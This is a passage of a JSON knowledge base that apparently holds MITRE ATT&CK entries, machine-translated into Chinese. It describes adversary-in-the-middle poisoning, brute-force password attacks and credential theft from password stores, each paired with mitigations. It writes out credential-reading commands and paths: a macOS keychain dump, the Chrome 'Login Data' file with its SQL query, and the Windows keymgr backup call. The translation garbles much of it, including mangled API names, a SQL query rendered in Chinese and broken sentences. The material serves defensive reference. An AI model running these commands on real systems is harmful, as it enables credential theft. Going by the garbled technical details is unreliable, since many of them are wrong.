    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Weaken Encryption",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手禁用网络设备专用的硬件加密，这可能使他们能够利用软件加密中的弱点，以减少收集，操纵和删除传输数据所涉及的精力。"
        }
      ],
      [
        {
          "type": "text",
          "content": "许多网络设备（例如路由器，开关和防火墙）对网络流量进行加密，以确保跨网络的传输。通常，这些设备配备了特殊的专用加密硬件，可大大提高加密过程的速度以及防止恶意篡改。当对手控制这种设备时，它们可能会禁用专用硬件，例如，通过使用修改系统映像，强迫使用软件在通用处理器上执行加密。这通常与攻击结合使用，以削弱软件中密码的强度（例如，减少钥匙空间）。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1557.001",
    "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Adversary-in-the-Middle",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "通过响应LLMNR/NBT-NS网络流量，对手可能会为姓名解决方案提供权威来源，以强迫与对手控制的系统进行通信。该活动可用于收集或中继身份验证材料。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Link-Local多播名称分辨率（LLMNR）和NetBios名称服务（NBT-NS）是Microsoft Windows组件，它们用作主机识别的替代方法。LLMNR基于域名系统（DNS）格式，允许在同一本地链接上的主机执行其他主机的名称分辨率。NBT-NS通过其NetBios名称在本地网络上标识系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过回应LLMNR（UDP 5355）/NBT-NS（UDP 137）流量来欺骗受害者网络上名称的权威来源，仿佛他们知道所请求的主机的身份，有效地毒害了受害者的服务，以便受害者会毒死。与对手控制的系统进行通信。如果所请求的主机属于需要标识/身份验证的资源，则用户名和NTLMV2哈希将被发送到对手控制的系统。然后，对手可以通过工具收集通过电线发送的哈希信息，该工具通过监视流量的端口或通过网络嗅探并通过蛮力离线破坏哈希，以获取授权密码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在某些情况下，对手可以访问系统身份验证路径中的系统或使用凭据扫描使用凭据尝试对对手控制的系统进行身份验证的自动扫描时，NTLMV1/V2哈希可以截获并传递以访问和执行代码针对目标系统。继电器步骤可以与中毒结合发生，但也可能与之无关。此外，对手可以将NTLMV1/V2哈希封装到各种协议中，例如LDAP，SMB，MSSQL和HTTP，以扩展和使用有效的NTLM响应的多个服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用几种工具来毒化本地网络中的名称服务，例如NBNSPOOF，METASPLOIT和RESSONDER。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "在本地计算机安全设置或组策略中禁用LLMNR和NETBIO，如果它们在环境中不需要。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "使用基于主机的安全软件阻止LLMNR/NetBios流量。启用SMB签名可以阻止NTLMV2继电器攻击。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "可以使用指示AITM活动的流量模式的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "网络细分可用于隔离不需要广泛网络访问的基础架构组件。这可能减轻或至少减轻AITM活动的范围。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1557.002",
    "name": "ARP Cache Poisoning",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Adversary-in-the-Middle",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会毒化解决分辨率协议（ARP）缓存，以将自己定位在两个或多个网络设备的通信之间。该活动可用于实现跟进行为，例如网络嗅探或传输数据操纵。"
        }
      ],
      [
        {
          "type": "text",
          "content": "ARP协议用于解析IPv4地址来链接层地址，例如媒体访问控制（MAC）地址。本地网络段中的设备通过使用链路层地址相互通信。如果网络设备没有特定网络设备的链接层地址，则可以将广播ARP请求发送到本地网络，以将IP地址转换为MAC地址。具有关联的IP地址的设备直接与其MAC地址回复。然后，提出ARP请求的网络设备将使用以及将这些信息存储在其ARP缓存中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会被动地等待ARP请求毒害请求设备的ARP缓存。对手可以用他们的MAC地址答复，从而欺骗受害者，使他们相信他们正在与预期的网络设备进行交流。为了使对手毒害ARP缓存，他们的答复必须比合法的IP地址所有者的答复更快。对手也可能会发送免费的ARP答复，该答复恶意地宣布了对本地网络细分市场中所有设备的特定IP地址的所有权。"
        }
      ],
      [
        {
          "type": "text",
          "content": "ARP协议是无状态的，不需要身份验证。因此，设备可能错误地添加或更新其ARP缓存中IP地址的MAC地址。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用ARP缓存中毒作为拦截网络流量的手段。该活动可用于收集和/或继电器数据，例如凭据，尤其是根据不安全的未加密协议发送的数据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑禁用在无用的ARP答复中更新ARP缓存。"
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "确保适当地加密所有有线和/或无线流量。使用最佳实践来进行身份验证协议，例如Kerberos，并确保可能包含凭据的网络流量受SSL/TLS的保护。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑在开关上启用DHCP侦听和动态ARP检查，以在通过DHCP和ARP表请求的IP地址之间创建映射，并将值将值绑定到可能阻止虚假流量的交换机上的端口。"
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
              "content": "为网络设备创建静态ARP条目。对于大型网络，实施静态ARP条目可能是不可行的。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "可以使用指示AITM活动的流量模式的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "培训用户对证书错误感到怀疑。对手可以使用自己的证书来拦截HTTPS流量。当应用程序的证书与主机预期的证书不匹配时，证书错误可能会出现。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1557.003",
    "name": "DHCP Spoofing",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0009",
        "name": "Collection"
      }
    ],
    "technique": "Adversary-in-the-Middle",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过欺骗动态主机配置协议（DHCP）流量并充当受害者网络上的恶意DHCP服务器，将网络流量重定向到对手拥有的系统。通过达到中间人（AITM）的位置，对手可以收集网络通信，包括传递的凭据，尤其是那些通过不安全的，未加密的协议发送的凭据。这也可以实现跟进行为，例如网络嗅探或传输数据操纵。"
        }
      ],
      [
        {
          "type": "text",
          "content": "DHCP基于客户端服务器模型，并具有两个功能：一种用于从DHCP服务器提供网络配置设置为客户端的协议，以及将网络地址分配给客户端的机制。典型的服务器客户交互如下："
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会在受害者网络上欺骗一个流氓DHCP服务器，合法主机可能会从中获得恶意网络配置。例如，恶意软件可以充当DHCP服务器，并为受害的计算机提供对手拥有的DNS服务器。通过恶意网络配置，对手可以实现AITM位置，通过对手控制的系统路由客户端流量，并从客户端网络收集信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "DHCPV6客户端可以通过向"
        },
        {
          "type": "code",
          "content": " inovery-request（代码11）"
        },
        {
          "type": "text",
          "content": "消息发送到"
        },
        {
          "type": "code",
          "content": " all_dhcp_relay_agents_and_and_servers "
        },
        {
          "type": "text",
          "content": " multiCast地址，而无需分配IP地址即可接收网络配置信息。对手可以使用其Rogue DHCP服务器以恶意网络配置来响应此请求消息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可能会通过生成许多广播发现的消息来耗尽网络的DHCP分配池，而不是建立AITM位置，而是可能滥用DHCP DHCP欺骗来进行DHCP耗竭攻击（即服务耗尽洪水）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑过滤端口67和68上的DHCP流量，从未知或未经信任的DHCP服务器中进行过滤。此外，在图层交换机上也可以启用端口安全性。此外，考虑在第2层开关上启用DHCP侦探，因为它将防止DHCP欺骗攻击和饥饿攻击。考虑通过脚本或工具跟踪可用的IP地址。"
            }
          ],
          [
            {
              "type": "text",
              "content": "此外，阻止DHCPV6流量和传入的路由器广告，尤其是在网络中常用IPv6时。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "可以使用指示AITM活动的流量模式的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1110.001",
    "name": "Password Guessing",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Brute Force",
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "在系统或环境中没有合法凭证的事先了解的对手可能会猜测密码尝试访问帐户。如果不知道帐户的密码，对手可以选择使用重复或迭代机制系统地猜测密码。对手可以使用通用密码列表在操作过程中猜测登录凭据，而无需对系统或环境密码的事先了解。密码猜测可能会或可能不会考虑到目标复杂性的目标策略，或者使用多次失败后可能会锁定帐户的策略。"
        }
      ],
      [
        {
          "type": "text",
          "content": "猜测密码可能是一个冒险的选择，因为它可能会导致大量身份验证失败和帐户锁定，具体取决于组织的登录失败策略。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通常，在猜测密码时，使用常用端口上的管理服务。通常针对的服务包括以下内容："
        }
      ],
      [
        {
          "type": "list",
          "content": "SSH（22/TCP）"
        },
        {
          "type": "list",
          "content": "Telnet（23/TCP）"
        },
        {
          "type": "list",
          "content": "FTP（21/TCP）"
        },
        {
          "type": "list",
          "content": "NetBios / SMB / Samba（139 / TCP和445 / TCP）"
        },
        {
          "type": "list",
          "content": "LDAP（389/TCP）"
        },
        {
          "type": "list",
          "content": "Kerberos（88/TCP）"
        },
        {
          "type": "list",
          "content": "RDP /终端服务（3389 / TCP）"
        },
        {
          "type": "list",
          "content": "HTTP/HTTP管理服务（80/TCP和443/TCP）"
        },
        {
          "type": "list",
          "content": "MSSQL（1433/TCP）"
        },
        {
          "type": "list",
          "content": "Oracle（1521/TCP）"
        },
        {
          "type": "list",
          "content": "MySQL（3306/TCP）"
        },
        {
          "type": "list",
          "content": "VNC（5900/TCP）"
        },
        {
          "type": "list",
          "content": "SNMP（161/UDP和162/TCP/UDP）"
        }
      ],
      [
        {
          "type": "text",
          "content": "除管理服务外，对手还可以“针对使用联合身份验证协议的单一签名（SSO）和基于云的应用程序”，以及外部面对的电子邮件应用程序，例如Office 365。此外，对手可能会滥用网络设备设备界面（例如"
        },
        {
          "type": "code",
          "content": " wlanapi "
        },
        {
          "type": "text",
          "content": "）通过无线身份验证协议，违反武力可访问的wifi-router。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在默认环境中，LDAP和Kerberos连接尝试不太可能通过SMB触发事件，从而创建Windows“登录失败”事件ID 4625。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "帐户使用政策",
        "description": [
          [
            {
              "type": "text",
              "content": "设置帐户锁定策略后，在一定数量的登录尝试中，试图防止密码被猜测。过于严格的政策可能会否认服务条件和渲染环境，而蛮力中使用的所有帐户都被锁定了。使用条件访问策略来阻止不合规设备或外部定义的组织IP范围的登录。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "使用多因素身份验证。在可能的情况下，还可以在外部面临的服务上启用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "创建密码策略时，请参阅NIST指南。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "将管理服务升级到最新的支持和兼容版本。具体而言，任何提供增加密码复杂性或策略执行的版本，以防止默认密码或弱密码。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1110.002",
    "name": "Password Cracking",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Brute Force",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "当获得凭证材料（例如密码哈希）时，对手可能会使用密码破解来尝试恢复可用的凭据，例如明文密码。OS凭据转储可用于获取密码哈希，这只能在通过哈希是一个选项时到目前为止获得对手。此外，对手可以利用配置存储库中的数据来获得网络设备的凭证。"
        }
      ],
      [
        {
          "type": "text",
          "content": "系统地猜测可用于计算哈希的密码可用，或者对手可以使用预先计算的彩虹表来破坏哈希。通常，在目标网络之外的对手控制的系统上进行破裂哈希。成功破解的哈希（Hash）产生的最终的明文密码可用于登录该帐户可以访问的系统，资源和服务。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "使用多因素身份验证。在可能的情况下，还可以在外部面临的服务上启用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "创建密码策略时，请参阅NIST指南。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1110.003",
    "name": "Password Spraying",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Brute Force",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用许多不同的帐户使用单个或小的密码列表来尝试获取有效的帐户凭据。密码喷涂使用一个密码（例如'password01'）或一小部分常用密码列表，可能与域的复杂性策略匹配。尝试使用该密码对网络上的许多不同帐户尝试使用该密码，以避免在Brute强迫一个带有许多密码的单个帐户时通常会发生的帐户锁定。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通常，在密码喷涂密码时，使用常用端口上的管理服务。通常针对的服务包括以下内容："
        }
      ],
      [
        {
          "type": "list",
          "content": "SSH（22/TCP）"
        },
        {
          "type": "list",
          "content": "Telnet（23/TCP）"
        },
        {
          "type": "list",
          "content": "FTP（21/TCP）"
        },
        {
          "type": "list",
          "content": "NetBios / SMB / Samba（139 / TCP和445 / TCP）"
        },
        {
          "type": "list",
          "content": "LDAP（389/TCP）"
        },
        {
          "type": "list",
          "content": "Kerberos（88/TCP）"
        },
        {
          "type": "list",
          "content": "RDP /终端服务（3389 / TCP）"
        },
        {
          "type": "list",
          "content": "HTTP/HTTP管理服务（80/TCP和443/TCP）"
        },
        {
          "type": "list",
          "content": "MSSQL（1433/TCP）"
        },
        {
          "type": "list",
          "content": "Oracle（1521/TCP）"
        },
        {
          "type": "list",
          "content": "MySQL（3306/TCP）"
        },
        {
          "type": "list",
          "content": "VNC（5900/TCP）"
        }
      ],
      [
        {
          "type": "text",
          "content": "除了管理服务外，对手还可以“使用联合身份验证协议的单一登录（SSO）和基于云的应用程序”，以及外部面对的电子邮件应用程序，例如Office 365。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在默认环境中，LDAP和Kerberos连接尝试不太可能通过SMB触发事件，从而创建Windows“登录失败”事件ID 4625。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "帐户使用政策",
        "description": [
          [
            {
              "type": "text",
              "content": "设置帐户锁定策略后，在一定数量的登录尝试中，试图防止密码被猜测。过于严格的政策可能会否认服务条件和渲染环境，而蛮力中使用的所有帐户都被锁定了。使用条件访问策略来阻止不合规设备或外部定义的组织IP范围的登录。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "使用多因素身份验证。在可能的情况下，还可以在外部面临的服务上启用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "创建密码策略时，请参阅NIST指南。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1110.004",
    "name": "Credential Stuffing",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Brute Force",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用从无关帐户漏洞获得的凭据来通过凭据重叠来访问目标帐户。有时，当网站或服务受到损害并访问用户帐户凭据时，大量的用户名和密码对将在线倾倒。该信息可能会通过利用用户在个人和业务帐户上使用相同密码的趋势来妥协帐户的对手有用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "凭证填充是一个冒险的选择，因为它可能会导致大量身份验证失败和帐户锁定，具体取决于组织的登录失败政策。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通常，在填充凭据时，使用了常用端口上的管理服务。通常针对的服务包括以下内容："
        }
      ],
      [
        {
          "type": "list",
          "content": "SSH（22/TCP）"
        },
        {
          "type": "list",
          "content": "Telnet（23/TCP）"
        },
        {
          "type": "list",
          "content": "FTP（21/TCP）"
        },
        {
          "type": "list",
          "content": "NetBios / SMB / Samba（139 / TCP和445 / TCP）"
        },
        {
          "type": "list",
          "content": "LDAP（389/TCP）"
        },
        {
          "type": "list",
          "content": "Kerberos（88/TCP）"
        },
        {
          "type": "list",
          "content": "RDP /终端服务（3389 / TCP）"
        },
        {
          "type": "list",
          "content": "HTTP/HTTP管理服务（80/TCP和443/TCP）"
        },
        {
          "type": "list",
          "content": "MSSQL（1433/TCP）"
        },
        {
          "type": "list",
          "content": "Oracle（1521/TCP）"
        },
        {
          "type": "list",
          "content": "MySQL（3306/TCP）"
        },
        {
          "type": "list",
          "content": "VNC（5900/TCP）"
        }
      ],
      [
        {
          "type": "text",
          "content": "除了管理服务外，对手还可以“使用联合身份验证协议的单一登录（SSO）和基于云的应用程序”，以及外部面对的电子邮件应用程序，例如Office 365。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "帐户使用政策",
        "description": [
          [
            {
              "type": "text",
              "content": "设置帐户锁定策略后，在一定数量的登录尝试中，试图防止密码被猜测。过于严格的政策可能会否认服务条件和渲染环境，而蛮力中使用的所有帐户都被锁定了。使用条件访问策略来阻止不合规设备或外部定义的组织IP范围的登录。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "使用多因素身份验证。在可能的情况下，还可以在外部面临的服务上启用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "创建密码策略时，请参阅NIST指南。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "立即或检测到Bruteforce尝试后，已知是违反证书的一部分的主动重置帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1555.001",
    "name": "Keychain",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Credentials from Password Stores",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会从钥匙扣那里获取凭证。密钥链（或钥匙扣服务）是MacOS凭证管理系统，该系统存储帐户名称，密码，私钥，证书，敏感应用程序数据，付款数据和安全说明。钥匙扣有三种类型：登录钥匙串，系统键链和本地项目（iCloud）钥匙扣。默认键链是登录键链，该键链存储用户密码和信息。系统键链存储操作系统访问的项目，例如主机上用户共享的项目。本地项目（iCloud）键链用于与Apple iCloud服务同步的项目。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以通过钥匙扣访问应用程序或使用命令行实用程序"
        },
        {
          "type": "code",
          "content": " Security "
        },
        {
          "type": "text",
          "content": "查看和编辑钥匙扣。密钥链文件位于"
        },
        {
          "type": "code",
          "content": "〜/library/keychains/"
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": "/library/keychains/"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "/network>/network/library/keychains/"
        },
        {
          "type": "text",
          "content": "中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会从钥匙扣存储/内存中收集用户凭据。例如，命令"
        },
        {
          "type": "code",
          "content": "安全转储 - 键链–D "
        },
        {
          "type": "text",
          "content": "将从"
        },
        {
          "type": "code",
          "content": "〜/library/keychains/login.keychain-db "
        },
        {
          "type": "text",
          "content": "转换所有登录密钥链凭据。对手也可以直接从"
        },
        {
          "type": "code",
          "content": "〜/library/keychains/login.keychain "
        },
        {
          "type": "text",
          "content": "文件中直接读取登录键链凭据。两种方法都需要一个密码，其中登录键链的默认密码是当前用户登录MACOS主机的密码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "用户登录密钥链的密码可以从用户的登录密码更改。这增加了对手的复杂性，因为他们需要知道附加密码。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1555.002",
    "name": "Securityd Memory",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Credentials from Password Stores",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以获取root访问（允许他们读取SecurityD的内存），然后他们可以通过内存扫描以在相对较少的尝试解密用户的登录键链中找到正确的键序列。这为对手提供了用于用户，WiFi，Mail，浏览器，证书，安全说明等的所有明文密码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在El Capitan之前的OS X中，具有root访问的用户可以读取已登录用户的明文键链密码，因为Apple的钥匙链实现允许将这些凭据缓存，以便无法重复提示用户以获取密码。Apple的SecurityD实用程序获取用户的登录密码，将其加密使用PBKDF2，然后将此主密钥存储在内存中。苹果还使用一组键和算法来加密用户密码，但是一旦找到主密钥，对手只需要迭代其他值就可以解锁最终密码。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1555.003",
    "name": "Credentials from Web Browsers",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Credentials from Password Stores",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过读取特定于目标浏览器的文件来从Web浏览器中获取凭据。Web浏览器通常保存凭据，例如网站用户名和密码，因此将来不需要手动输入它们。Web浏览器通常以加密格式将凭据存储在凭据存储中；但是，存在从Web浏览器中提取明文凭据的方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, "
        },
        {
          "type": "code",
          "content": "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
        },
        {
          "type": "text",
          "content": " and executing a SQL query: <代码>选择action_url，username_value，logins; </code>的password_value。然后，可以通过将加密的凭据传递到Windows API函数"
        },
        {
          "type": "code",
          "content": " CryptunProtectData "
        },
        {
          "type": "text",
          "content": "来获得明文密码，该凭据<Code> CryptunProtectData </code>使用受害人的缓存登录凭证作为解密密钥。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手已经为Firefox，Safari，Edge等常见的Web浏览器执行了类似的过程。Windows商店Internet Explorer和Microsoft Edge凭据在由Windows凭据管理器管理的凭证储物柜中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以通过搜索Web浏览器进程内存以获取通常匹配凭据的模式来获取凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "从Web浏览器中获取凭据后，对手可能会尝试回收不同系统和/或帐户的凭据以扩展访问。如果从Web浏览器获得的凭据与特权帐户重叠（例如域管理员）重叠的情况下，这可能会导致对手的目标。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "组织可能会考虑权衡在网络浏览器中存储证书的风险。如果Web浏览器凭据披露是一个重大问题，则可以使用技术控制，政策和用户培训来防止在Web浏览器中存储凭据。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1555.004",
    "name": "Windows Credential Manager",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Credentials from Password Stores",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以从Windows凭据管理器中获取凭据。凭证管理器存储凭证，以在凭证储物柜（以前称为Windows Vaults）中登录通过NTLM或Kerberos请求身份验证的网站，应用程序和/或设备。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows凭据管理器将网站凭据与两个储物柜中的应用程序或网络凭据分开。作为Web浏览器凭证的一部分，Internet Explorer和Microsoft Edge网站凭据由凭据管理器管理，并存储在Web凭据储物柜中。应用程序和网络凭据存储在Windows凭据储物柜中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "凭证更储物柜商店凭据"
        },
        {
          "type": "code",
          "content": " .vcrd "
        },
        {
          "type": "text",
          "content": "文件，位于"
        },
        {
          "type": "code",
          "content": "％systemDrive％\\ users \\\\ [username] \\ appdata \\ local \\ local \\ Microsoft \\\\ [vault/recortentials] \\ "
        },
        {
          "type": "text",
          "content": " </code>。加密密钥可以在名为"
        },
        {
          "type": "code",
          "content": " policy.vpol "
        },
        {
          "type": "text",
          "content": "的文件中找到，该文件通常位于与凭据同一文件夹中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过几种机制列出由Windows凭据管理器管理的凭据。"
        },
        {
          "type": "code",
          "content": " Vaultcmd.exe "
        },
        {
          "type": "text",
          "content": "是一种本机Windows可执行文件，可用于通过命令行界面列举存储在凭证储物柜中的凭据。对手还可以通过直接读取凭据储物柜内部的文件来收集凭据。Windows API，例如"
        },
        {
          "type": "code",
          "content": " redreNumeratea "
        },
        {
          "type": "text",
          "content": "，也可以符合凭证管理器管理的凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以从凭据备份中获得凭证。凭证备份和还原可以通过运行"
        },
        {
          "type": "code",
          "content": " rundll32.exe keymgr.dll krshowkeymgr "
        },
        {
          "type": "text",
          "content": "进行执行，然后在“存储的用户名和密码” GUI上选择“备份...”按钮。"
        }
      ],
      [
        {
          "type": "text",
          "content": "密码恢复工具还可以从凭据管理器获取纯文本密码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑启用“网络访问：不允许存储密码和网络身份验证的凭据”设置，该设置将阻止网络凭据由凭据管理器存储。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1555.005",
    "name": "Password Managers",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Credentials from Password Stores",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以从第三方密码管理人员那里获取用户凭据。密码管理器是旨在存储用户凭据的应用程序，通常是在加密数据库中。用户提供解锁数据库的主密码后，通常可以访问凭据。解锁数据库后，可以将这些凭据复制到内存。这些数据库可以作为文件存储在磁盘上。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过从内存中提取主密码和/或普通文本凭据来从密码管理人员那里获取用户凭据。对手可以通过剥削从内存中提取凭据以获得凭证访问。对手也可以尝试通过密码猜测强迫蛮力，以获取密码管理器的主密码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "为主密码创建密码策略时，请参阅NIST指南。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑短暂超时后，请考虑重新锁定密码管理器，以限制从解密的数据库中的内存中使用的时间。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "定期更新密码管理器，通过为内部企业端点和服务器采用补丁管理。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1555.006",
    "name": "Cloud Secrets Management Stores",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Credentials from Password Stores",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以从AWS Secrets Manager，GCP Secret Manager，Azure Key Vault和Terraform Vault等云机构秘密管理解决方案中获取凭证。"
        }
      ],
      [
        {
          "type": "text",
          "content": "秘密经理支持密码，API密钥和其他凭据材料的安全集中管理。在使用秘密经理的地方，云服务可以通过API请求动态获取凭据，而不是访问纯文本文件或环境变量中存储的秘密。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果对手能够在云环境中获得足够的特权 - 例如，通过获得高挑战云帐户的凭据或损害有权检索秘密的服务的凭据 - 他们可能能够从Secrets Manager中请求秘密。这可以通过AWS中的"
        },
        {
          "type": "code",
